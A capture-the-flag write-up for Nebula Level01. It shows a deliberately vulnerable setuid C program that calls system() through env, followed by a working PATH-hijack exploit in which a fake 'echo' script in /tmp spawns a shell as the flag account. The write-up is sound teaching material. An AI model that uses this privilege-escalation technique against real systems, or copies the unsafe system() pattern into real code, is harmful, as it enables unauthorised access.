# Level01

## Task

>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Solution

So the above code loads the users enviroment and then runs echo followed by a string, by modifying the `PATH` variable it can be exploited.

```
level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ echo "/bin/bash"  >> /tmp/echo
level01@nebula:/home/flag01$ chmod +x /tmp/echo
```

```
level01@nebula:/home/flag01$ ./flag01

flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
```
